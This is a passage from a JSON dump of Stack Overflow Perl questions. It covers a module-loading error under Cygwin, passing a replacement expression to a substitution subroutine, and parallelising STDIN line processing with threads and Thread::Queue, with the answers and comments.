locate object method \"init\" via package \"wlgmod::doc\" (perhaps you forgot to load \"wlgmod::doc\"?) at /cygdrive/c/WYD/wyd.pl line 284.</p>\n</blockquote>\n\n<p>Sometimes <code>wlgmod::doc</code> is replaced with <code>wlgmod:jpeg</code> or <code>wlgmod::plain</code>, but it's the same basic error. This is a welcome change from when I tried to run the program in CMD, which came back with tens of missing dependencies, but I'd like to figure out how to make this final one go away so I can finally run the program.</p>\n\n<p>Looking in the directory where WyD is installed on Windows - <code>C:\\WYD</code> - I see a folder called <em>wlgmod</em>, which contains <code>doc.pm</code>, <code>jpeg.pm</code>, <code>html.pm</code>, etc. Presumably, these are the 2packages\" that bash is asking for, but judging by the output of the above error, it seems to be running WyD from that very same directory, so I'm confused as to why it can't find those files.</p>\n\n<p>The only thing I can guess is that all this has something to do with the version of Perl being run. Doing <code>perl -v</code> in both consoles bolsters this a little.</p>\n\n<pre><code>CMD - V5.24.1\nCygwin/bash - V5.22.3\n</code></pre>\n\n<p>Other than that... I'm really confused and I have no idea what I'm doing.</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 87649, "user_id": 17389, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/cd06d1314817ce946ab796af8750b56a?s=128&d=identicon&r=PG", "display_name": "ysth", "link": "https://stackoverflow.com/users/17389/ysth"}, "edited": false, "score": 4, "creation_date": 1485724424, "post_id": 41925758, "comment_id": 71032494, "body": "The replacement part <i>isn&#39;t a regex</i>.  Don&#39;t try to make it one.  the sub{} way is the correct way to do this."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1485725678, "post_id": 41925758, "comment_id": 71032918, "body": "See <a href=\"http://stackoverflow.com/a/41280344/4653379\">this post</a> (for example) for what kinds of things you&#39;d need to do. Use the <code>sub</code> approach you discovered, that&#39;s a nice way to work with  regex :)"}, {"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1485725815, "post_id": 41925758, "comment_id": 71032959, "body": "@zdim That code could be simplified a lot by using <a href=\"https://metacpan.org/pod/Data::Munge#replace-STRING,-REGEX,-REPLACEMENT,-FLAG\" rel=\"nofollow noreferrer\"><code>Data::Munge::replace</code></a>."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1485726109, "post_id": 41925758, "comment_id": 71033052, "body": "@melpomene  Look verys cool :)  Thank you -- it&#39;s hard to know of what is out there!  I&#39;ll add this to that post, along with <code>String::Substitution</code> note.  (This may be even more to the point, need to play with it a little first.)"}], "answers": [{"tags": [], "owner": {"reputation": 19969, "user_id": 23512, "user_type": "registered", "accept_rate": 56, "profile_image": "https://i.stack.imgur.com/tUj1I.png?s=128&g=1", "display_name": "Tanktalus", "link": "https://stackoverflow.com/users/23512/tanktalus"}, "is_accepted": false, "score": 1, "last_activity_date": 1485723445, "creation_date": 1485723445, "answer_id": 41925877, "question_id": 41925758, "link": "https://stackoverflow.com/questions/41925758/use-qr-to-pass-replace-regex-to-subroutine/41925877#41925877", "title": "Use qr// to pass replace RegEx to subroutine", "body": "<p>You have to understand that the text in the replace is not a regex, but a string, ready to be interpolated.  So you will have to do things like your workaround in order to delay interpolation until the regex has run against the required string.</p>\n\n<p>That being said, if your sub is as simple as this, I'm not sure you really should put it in a sub - the <code>s</code> operator already is a sub call, and you're just complicating things.  There are situations, of course, where you need to pass in a regex or whatever to a far more complex sub, and that could be a good thing, but you'd still need this type of delayed interpolation for it to work.</p>\n"}, {"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 3, "last_activity_date": 1485731251, "last_edit_date": 1485731251, "creation_date": 1485728534, "answer_id": 41926624, "question_id": 41925758, "link": "https://stackoverflow.com/questions/41925758/use-qr-to-pass-replace-regex-to-subroutine/41926624#41926624", "title": "Use qr// to pass replace RegEx to subroutine", "body": "<p>First of all, using <code>qr//</code> for the replacement expression makes no sense since the replacement expression is not a regex pattern. <code>qq//</code> (double-quoted string) and <code>q//</code> (single-quoted string) are used to construct strings.</p>\n\n<p>The main problem is that</p>\n\n<pre><code>s/$findRegEx/&lt;I&gt;$replaceRegEx&lt;\\/I&gt;/g\n</code></pre>\n\n<p>means</p>\n\n<pre><code>my $repl_expr = sub { qq/&lt;I&gt;$replaceRegEx&lt;\\/I&gt;/ };  # Interpolates $replaceRegEx\ns/$findRegEx/ $repl_expr-&gt;() /eg\n</code></pre>\n\n<p>but you really want</p>\n\n<pre><code>my $repl_expr = sub { qq/$1&lt;B&gt;$2&lt;\\/B&gt;$3/ };         # Interpolates $1, $2 and $3\ns/$findRegEx/ $repl_expr-&gt;() /eg\n</code></pre>\n\n<p>If you need to start from a string (e.g. the replacement expression comes from a config file), then you can achieve what you want with the following:</p>\n\n<pre><code>use String::Substitution qw( gsub_copy );\n\nmy $newText = gsub_copy($text, qr/(33 )(.*?)( 55)/, '$1&lt;BOLD&gt;$2&lt;/BOLD&gt;$3');\n</code></pre>\n"}], "owner": {"reputation": 3599, "user_id": 3503851, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/3f4e91b450a25ee2170025f0b56332fa?s=128&d=identicon&r=PG&f=1", "display_name": "Omar", "link": "https://stackoverflow.com/users/3503851/omar"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 209, "favorite_count": 0, "answer_count": 2, "score": -1, "last_activity_date": 1485745781, "creation_date": 1485722773, "last_edit_date": 1485724262, "question_id": 41925758, "link": "https://stackoverflow.com/questions/41925758/use-qr-to-pass-replace-regex-to-subroutine", "title": "Use qr// to pass replace RegEx to subroutine", "body": "<p>I have a find_replace subroutine that takes in parameters (content, find regex, replace regex, result variable to store result in). I use <code>qr//</code> to pass both the find and replace regex. Find regex works well, but the replace regex doesn't. </p>\n\n<pre><code>$text = \"11 22 33 44 55\";\nfind_replace($text,qr/(33 )(.*?)( 55)/,qr/$1&lt;BOLD&gt;$2&lt;\\/BOLD&gt;$3/,my $newText);\nprint $newText;\n     #Should print: 11 22 &lt;I&gt;33 &lt;B&gt;44&lt;/B&gt; 55&lt;/I&gt;\n     #But it prints: 11 22 &lt;I&gt;(?^:&lt;B&gt;&lt;/B&gt;)&lt;/I&gt;\n\nsub find_replace {\n    my $content = shift;\n    my $findRegEx = shift;\n    my $replaceRegEx = shift;\n    my $newVariable = \\shift;\n\n    ${$newVariable} = $content;\n    ${$newVariable} =~ s/$findRegEx/&lt;I&gt;$replaceRegEx&lt;\\/I&gt;/g;\n}\n</code></pre>\n\n<p>I've found a fix  for this to work:</p>\n\n<pre><code>$text = \"11 22 33 44 55\";\nfind_replace($text,qr/(33 )(.*?)( 55)/,sub{\"$1&lt;B&gt;$2&lt;\\/B&gt;$3\"},my $newText);\nprint $newText;\n     #Prints: 11 22 &lt;I&gt;33 &lt;B&gt;44&lt;/B&gt; 55&lt;/I&gt;\n\nsub find_replace {\n    my $content = shift;\n    my $findRegEx = shift;\n    my $replaceRegEx = shift;\n    my $newVariable = \\shift;\n\n    ${$newVariable} = $content;\n    ${$newVariable} =~ s($findRegEx){ \"&lt;I&gt;\".$replaceRegEx-&gt;().\"&lt;\\/I&gt;\" }ge;\n}\n</code></pre>\n\n<p>But this fix uses <code>sub{\"\u2026\"}</code> instead of <code>qr/\u2026/</code>. What I'm looking for is to keep using the <code>qr//</code> for passing the replace regex and get the same result.</p>\n"}, {"tags": ["perl", "while-loop", "parallel-processing"], "comments": [{"owner": {"reputation": 144799, "user_id": 2836621, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/suHg4.jpg?s=128&g=1", "display_name": "Mark Setchell", "link": "https://stackoverflow.com/users/2836621/mark-setchell"}, "edited": false, "score": 2, "creation_date": 1485726044, "post_id": 41925586, "comment_id": 71033033, "body": "Leave your code unchanged and wrap it in <b>GNU Parallel</b> maybe... <code>cat hugeData | parallel --pipe .&#47;existingScript.pl</code>. Or <i>shebang-wrap</i> your existing script... <a href=\"https://www.gnu.org/software/parallel/parallel_tutorial.html#Shebang\" rel=\"nofollow noreferrer\">gnu.org/software/parallel/parallel_tutorial.html#Shebang</a>"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1485741249, "post_id": 41925586, "comment_id": 71036685, "body": "<code>cat hugeData |</code> is better replaced with <code>&lt;hugeData</code>"}, {"owner": {"reputation": 3703, "user_id": 2127296, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/kjm9H.png?s=128&g=1", "display_name": "Iv&#225;n Rodr&#237;guez Torres", "link": "https://stackoverflow.com/users/2127296/iv%c3%a1n-rodr%c3%adguez-torres"}, "reply_to_user": {"reputation": 144799, "user_id": 2836621, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/suHg4.jpg?s=128&g=1", "display_name": "Mark Setchell", "link": "https://stackoverflow.com/users/2836621/mark-setchell"}, "edited": false, "score": 0, "creation_date": 1485770344, "post_id": 41925586, "comment_id": 71046369, "body": "@MarkSetchell thanks. But time is a little bit worse than running the script as it is."}, {"owner": {"reputation": 144799, "user_id": 2836621, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/suHg4.jpg?s=128&g=1", "display_name": "Mark Setchell", "link": "https://stackoverflow.com/users/2836621/mark-setchell"}, "edited": false, "score": 0, "creation_date": 1485770551, "post_id": 41925586, "comment_id": 71046501, "body": "Ok, hopefully it was worth a try. I guess the time is dominated by I/O rather than calculation, so parallelising the processing is not going to help much."}, {"owner": {"reputation": 3703, "user_id": 2127296, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/kjm9H.png?s=128&g=1", "display_name": "Iv&#225;n Rodr&#237;guez Torres", "link": "https://stackoverflow.com/users/2127296/iv%c3%a1n-rodr%c3%adguez-torres"}, "reply_to_user": {"reputation": 144799, "user_id": 2836621, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/suHg4.jpg?s=128&g=1", "display_name": "Mark Setchell", "link": "https://stackoverflow.com/users/2836621/mark-setchell"}, "edited": false, "score": 0, "creation_date": 1485773869, "post_id": 41925586, "comment_id": 71048619, "body": "@MarkSetchell yep, it seems that you&#39;re right. Later I&#39;m gonna try the script with the full text, which takes 1 week to finish. Maybe there we can see the diference."}], "answers": [{"comments": [{"owner": {"reputation": 3703, "user_id": 2127296, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/kjm9H.png?s=128&g=1", "display_name": "Iv&#225;n Rodr&#237;guez Torres", "link": "https://stackoverflow.com/users/2127296/iv%c3%a1n-rodr%c3%adguez-torres"}, "edited": false, "score": 0, "creation_date": 1485724135, "post_id": 41925694, "comment_id": 71032386, "body": "I haven&#39;t accepted the answer yet because after applying your solution the script throws errors than had never appear before. If I manage to solve them I will accept since your queue systems looks pretty useful."}, {"owner": {"reputation": 384453, "user_id": 1126841, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fa05233b2357f8d11c22ef4cfc7bb85c?s=128&d=identicon&r=PG", "display_name": "chepner", "link": "https://stackoverflow.com/users/1126841/chepner"}, "edited": false, "score": 0, "creation_date": 1485729449, "post_id": 41925694, "comment_id": 71034099, "body": "I don&#39;t feel I have enough recent experience in Perl to downvote, but the <code>threads</code> module is <i>officially</i> discouraged. They are not as lightweight as you would expect. (I do recall trying to use them in an I/O-bound project about 7 years ago, and they made the code about 5x <i>slower</i>.)"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 384453, "user_id": 1126841, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fa05233b2357f8d11c22ef4cfc7bb85c?s=128&d=identicon&r=PG", "display_name": "chepner", "link": "https://stackoverflow.com/users/1126841/chepner"}, "edited": false, "score": 0, "creation_date": 1485731581, "post_id": 41925694, "comment_id": 71034646, "body": "@chepner  Given that the use is &quot;discouraged&quot;, as we all know, I keep thinking about uses which are still reasonable.  (Threads do offer specific benefits, after all.)  So, I am curious -- in your project, they were &quot;<i>5x slower</i>&quot; ... in comparison to what? Sequential processing, or forking, or ...?  Btw, I&#39;d like to know about reasons for downvote, too."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 384453, "user_id": 1126841, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fa05233b2357f8d11c22ef4cfc7bb85c?s=128&d=identicon&r=PG", "display_name": "chepner", "link": "https://stackoverflow.com/users/1126841/chepner"}, "edited": false, "score": 0, "creation_date": 1485741704, "post_id": 41925694, "comment_id": 71036783, "body": "@chepner, Re <i>they made the code about 5x slower</i>&quot;, You did something seriously wrong, then. That&#39;s why the warning is there. Multi-tasking is hard."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 384453, "user_id": 1126841, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fa05233b2357f8d11c22ef4cfc7bb85c?s=128&d=identicon&r=PG", "display_name": "chepner", "link": "https://stackoverflow.com/users/1126841/chepner"}, "edited": false, "score": 0, "creation_date": 1485741873, "post_id": 41925694, "comment_id": 71036827, "body": "@chepner, Re &quot;<i>the threads module is officially discouraged</i>&quot;, They are discouraged for the reason stated in the previous paragraph: They are heavy and multi-tasking is complicated. The same applies to Parallel::Loops. It would be just as discouraged by that same author."}, {"owner": {"reputation": 3703, "user_id": 2127296, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/kjm9H.png?s=128&g=1", "display_name": "Iv&#225;n Rodr&#237;guez Torres", "link": "https://stackoverflow.com/users/2127296/iv%c3%a1n-rodr%c3%adguez-torres"}, "edited": false, "score": 0, "creation_date": 1485770612, "post_id": 41925694, "comment_id": 71046552, "body": "Thank you for this answer, but this solution is two time slower than the original script."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1485790960, "post_id": 41925694, "comment_id": 71059947, "body": "And you said the original script is 120x slower than the original script. The difference between 120x slower and 240x slower is actually very small. The issue, again, is that you do far too little per work unit. Read more lines at once!"}, {"owner": {"reputation": 3703, "user_id": 2127296, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/kjm9H.png?s=128&g=1", "display_name": "Iv&#225;n Rodr&#237;guez Torres", "link": "https://stackoverflow.com/users/2127296/iv%c3%a1n-rodr%c3%adguez-torres"}, "reply_to_user": {"reputation": 384453, "user_id": 1126841, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fa05233b2357f8d11c22ef4cfc7bb85c?s=128&d=identicon&r=PG", "display_name": "chepner", "link": "https://stackoverflow.com/users/1126841/chepner"}, "edited": false, "score": 0, "creation_date": 1486428009, "post_id": 41925694, "comment_id": 71330993, "body": "@chepner and Tanktalus, a bit late, but finally I could update the question to reflect my experience. I let you now just in case you were curious about the topic"}], "tags": [], "owner": {"reputation": 19969, "user_id": 23512, "user_type": "registered", "accept_rate": 56, "profile_image": "https://i.stack.imgur.com/tUj1I.png?s=128&g=1", "display_name": "Tanktalus", "link": "https://stackoverflow.com/users/23512/tanktalus"}, "is_accepted": false, "score": 0, "last_activity_date": 1485732877, "last_edit_date": 1485732877, "creation_date": 1485722385, "answer_id": 41925694, "question_id": 41925586, "link": "https://stackoverflow.com/questions/41925586/empty-while-reading-stdin-in-parallel/41925694#41925694", "title": "$_ empty while reading STDIN in parallel", "body": "<p>Probably the simplest manner here is to create a pool of threads, each one listening on the same queue, and then have one thread (probably the main thread) read the file and push each line on to the queue.</p>\n\n<pre><code>use strict;\nuse warnings;\nuse Thread qw(async);\nuse Thread::Queue;\n\nmy $q = Thread::Queue-&gt;new();\n$q-&gt;limit(32); # no point in reading in more than this into memory.\n\nmy @thr = map {\n    async {\n        while (defined (my $line = $q-&gt;dequeue()) ) {\n            print $line;\n        }\n    };\n} 1..4; # 4 worker threads\n\nwhile (&lt;STDIN&gt;)\n{\n    $q-&gt;enqueue($_);\n}\n$q-&gt;end();\n\n$_-&gt;join for Thread-&gt;list;\n</code></pre>\n\n<p>Just as a point of warning, beware if you need to push data from the worker threads back to the main thread.  It's not as trivial as in other languages.</p>\n\n<p><em>Update</em>: switch from threads to Thread. While the async function is documented as returning thread objects, that didn't seem to work for me, so had to change the join as well.</p>\n"}, {"comments": [{"owner": {"reputation": 3703, "user_id": 2127296, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/kjm9H.png?s=128&g=1", "display_name": "Iv&#225;n Rodr&#237;guez Torres", "link": "https://stackoverflow.com/users/2127296/iv%c3%a1n-rodr%c3%adguez-torres"}, "edited": false, "score": 0, "creation_date": 1485770494, "post_id": 41928031, "comment_id": 71046456, "body": "Thank you, this answer perfectly the question. The problem is that is slower than the script without parallelism. I made some test with a reduced input (about 40mb plain text) and takes more than 2min to finish while the original script takes 12secs."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 3703, "user_id": 2127296, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/kjm9H.png?s=128&g=1", "display_name": "Iv&#225;n Rodr&#237;guez Torres", "link": "https://stackoverflow.com/users/2127296/iv%c3%a1n-rodr%c3%adguez-torres"}, "edited": false, "score": 0, "creation_date": 1485786744, "post_id": 41928031, "comment_id": 71057067, "body": "If the amount of work per line is small, of course it is. You need larger work units"}, {"owner": {"reputation": 3703, "user_id": 2127296, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/kjm9H.png?s=128&g=1", "display_name": "Iv&#225;n Rodr&#237;guez Torres", "link": "https://stackoverflow.com/users/2127296/iv%c3%a1n-rodr%c3%adguez-torres"}, "edited": false, "score": 0, "creation_date": 1485787811, "post_id": 41928031, "comment_id": 71057760, "body": "yep, you&#39;re right. The amount of work at this moment is small, just a couple of regex matching"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 3703, "user_id": 2127296, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/kjm9H.png?s=128&g=1", "display_name": "Iv&#225;n Rodr&#237;guez Torres", "link": "https://stackoverflow.com/users/2127296/iv%c3%a1n-rodr%c3%adguez-torres"}, "edited": false, "score": 0, "creation_date": 1485790741, "post_id": 41928031, "comment_id": 71059772, "body": "So read more lines at once. Have each worker process 10, 100, 1000 lines at a time."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 3703, "user_id": 2127296, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/kjm9H.png?s=128&g=1", "display_name": "Iv&#225;n Rodr&#237;guez Torres", "link": "https://stackoverflow.com/users/2127296/iv%c3%a1n-rodr%c3%adguez-torres"}, "edited": false, "score": 0, "creation_date": 1485808029, "post_id": 41928031, "comment_id": 71069771, "body": "Added to my answer."}, {"owner": {"reputation": 3703, "user_id": 2127296, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/kjm9H.png?s=128&g=1", "display_name": "Iv&#225;n Rodr&#237;guez Torres", "link": "https://stackoverflow.com/users/2127296/iv%c3%a1n-rodr%c3%adguez-torres"}, "edited": false, "score": 0, "creation_date": 1485864138, "post_id": 41928031, "comment_id": 71092786, "body": "First place, thank you for spending your time elaborating this. Second, It seems that threads need more working load. I was playing with the <code>num_lines_to_collect</code> and I get the best results with the value 100000 and this result is one second slower than the original script. I&#39;m going to keep working on this and add working load to the job. I will post results."}, {"owner": {"reputation": 3703, "user_id": 2127296, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/kjm9H.png?s=128&g=1", "display_name": "Iv&#225;n Rodr&#237;guez Torres", "link": "https://stackoverflow.com/users/2127296/iv%c3%a1n-rodr%c3%adguez-torres"}, "edited": false, "score": 0, "creation_date": 1486427282, "post_id": 41928031, "comment_id": 71330818, "body": "a bit late, but finally I could update the question to reflect my experience. I let you now just in case you were curious about the topic"}, {"owner": {"reputation": 3703, "user_id": 2127296, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/kjm9H.png?s=128&g=1", "display_name": "Iv&#225;n Rodr&#237;guez Torres", "link": "https://stackoverflow.com/users/2127296/iv%c3%a1n-rodr%c3%adguez-torres"}, "edited": false, "score": 0, "creation_date": 1489020603, "post_id": 41928031, "comment_id": 72493380, "body": "Hi, in the code you use: <code>async {...}</code>. How is that called? I mean was looking for it on Google but it seems that I an&#39;t found it. I tried things like: &quot;async block perl&quot;, and in spite of I get results related I haven&#39;t got  complete info about how it works. Is it the same as <code>Async-&gt;new(..)</code>? Thank you"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 3703, "user_id": 2127296, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/kjm9H.png?s=128&g=1", "display_name": "Iv&#225;n Rodr&#237;guez Torres", "link": "https://stackoverflow.com/users/2127296/iv%c3%a1n-rodr%c3%adguez-torres"}, "edited": false, "score": 0, "creation_date": 1489045709, "post_id": 41928031, "comment_id": 72501861, "body": "@Iv&#225;n Rodr&#237;guez Torres, It&#39;s from the <a href=\"http://search.cpan.org/perldoc?threads\" rel=\"nofollow noreferrer\">threads</a> module. (<code>use threads qw( async );</code> should have made that clear!) <code>my $thread = async { ... };</code> is short for <code>my $thread = thread-&gt;create(sub { ... });</code>"}, {"owner": {"reputation": 3703, "user_id": 2127296, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/kjm9H.png?s=128&g=1", "display_name": "Iv&#225;n Rodr&#237;guez Torres", "link": "https://stackoverflow.com/users/2127296/iv%c3%a1n-rodr%c3%adguez-torres"}, "edited": false, "score": 0, "creation_date": 1489050587, "post_id": 41928031, "comment_id": 72504696, "body": "yep, you are right. Thank you for another doubt solved!"}], "tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": true, "score": 4, "last_activity_date": 1485808572, "last_edit_date": 1485808572, "creation_date": 1485741041, "answer_id": 41928031, "question_id": 41925586, "link": "https://stackoverflow.com/questions/41925586/empty-while-reading-stdin-in-parallel/41928031#41928031", "title": "$_ empty while reading STDIN in parallel", "body": "<p><code>$_</code> is never set because you never assign to <code>$_</code>!</p>\n\n<p>Don't forget that </p>\n\n<pre><code>while (&lt;STDIN&gt;) { ... }\n</code></pre>\n\n<p>is short for</p>\n\n<pre><code>while (defined( $_ = &lt;STDIN&gt; )) { ... }\n</code></pre>\n\n<p>That means you were looking to use the following:</p>\n\n<pre><code>$pl-&gt;while ( sub { defined( $_ = &lt;STDIN&gt; ) }, sub {\n    print $_;\n}\n</code></pre>\n\n<p>That said, clobbering <code>$_</code> is a bad idea. It could very well have been aliased to some other variable by a <code>for (...)</code> in the caller.</p>\n\n<p>That means you should be using the following:</p>\n\n<pre><code>my $line;\n$pl-&gt;while ( sub { defined( $line = &lt;STDIN&gt; ) }, sub {\n    print $line;\n}\n</code></pre>\n\n<p>You may find that breaking down the work into coarser units that lines will yield better performance as it reduces the overheard to work ratio.</p>\n\n<pre><code>use constant WORK_UNIT_SIZE =&gt; 100;\n\nmy $done = 0;\nmy @lines;\n$pl-&gt;while ( sub {\n    @lines = ();\n    return 0 if $done;\n\n    while (@lines &lt; WORK_UNIT_SIZE) {\n        my $line = &lt;&gt;;\n        if (!defined($line)) {\n            $done = 1;\n            return 0+@lines;\n        }\n\n        push @lines, $line;\n    }\n\n    return 1;\n}, sub {\n    for (@lines) {\n        print $_;\n    }\n}\n</code></pre>\n\n<p>Finally, rather than creating a new task for each work unit, you should reuse them! The following demonstrates this using threads.</p>\n\n<pre><code>use threads            qw( async );\nuse Thread::Queue 3.01 qw( );\n\nuse constant NUM_WORKERS    =&gt; 8;\nuse constant WORK_UNIT_SIZE =&gt; 100;\n\nsub worker {\n    my ($job) = @_;\n    for (@$job) {\n        print $_;\n    }\n}\n\nmy $q = Thread::Queue-&gt;new();\n$q-&gt;limit(NUM_WORKERS * 4);\n\nasync { while (defined( my $job = $q-&gt;dequeue() )) { worker($job); } }\n    for 1..NUM_WORKERS;\n\nmy $done = 0;    \nwhile (!$done) {\n    my @lines;\n    while (@lines &lt; WORK_UNIT_SIZE) {\n        my $line = &lt;&gt;;\n        if (!defined($line)) {\n            $done = 1;\n            last;\n        }\n\n        push @lines, $line;\n    }\n\n    $q-&gt;enqueue(\\@lines) if @lines;\n}\n\n$q-&gt;end();\n$_-&gt;join for threads-&gt;list;\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 3703, "user_id": 2127296, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/kjm9H.png?s=128&g=1", "display_name": "Iv&#225;n Rodr&#237;guez Torres", "link": "https://stackoverflow.com/users/2127296/iv%c3%a1n-rodr%c3%adguez-torres"}, "edited": false, "score": 0, "creation_date": 1485773754, "post_id": 41928668, "comment_id": 71048547, "body": "I don&#39;t need the return since I print to STDOUT so I removed that. The solution works, so I upvote. The problem of this is the same as in the accepted answer, this is slower than the script without parallelism. I made some test with a reduced input (about 40mb plain text) and takes more than 2min to finish while the original script takes 12secs. But I think that this should be a new qestion. Thank you"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 3703, "user_id": 2127296, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/kjm9H.png?s=128&g=1", "display_name": "Iv&#225;n Rodr&#237;guez Torres", "link": "https://stackoverflow.com/users/2127296/iv%c3%a1n-rodr%c3%adguez-torres"}, "edited": false, "score": 0, "creation_date": 1485798156, "post_id": 41928668, "comment_id": 71064378, "body": "I thought that &quot;input&quot; is more than just one line to process, that it triggers a job.  If it is one little thing to do than spawing a process each time is a huge overhead.  So read a bunch of lines, than fire a process. I added code for that."}, {"owner": {"reputation": 3703, "user_id": 2127296, "user_type": "registered", 